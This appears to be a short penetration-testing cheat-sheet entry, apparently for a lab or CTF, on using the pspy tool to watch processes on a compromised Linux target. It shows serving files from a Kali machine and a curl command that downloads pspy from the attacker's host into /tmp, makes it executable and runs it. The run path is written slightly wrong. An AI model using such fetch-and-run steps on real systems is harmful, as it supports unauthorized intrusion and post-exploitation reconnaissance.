```use-pspy-precompiled
#At kali machine
python3 -m http.server 80
#at target machine
curl http://$kaliIP/pspy32s -o /tmp/pspy32s
chmod +x /tmp/pspy32s
./tmp/pspy32s
```

We can use a tools `pspy` to monitor running services.

Check the target machine architecture `uname -a`and download the compiled files to the target machine. Either static or small version will do, I do prefer small version for ease of transfer to the target machine.

[PSPY GitHub] (https://github.com/DominicBreuker/pspy)
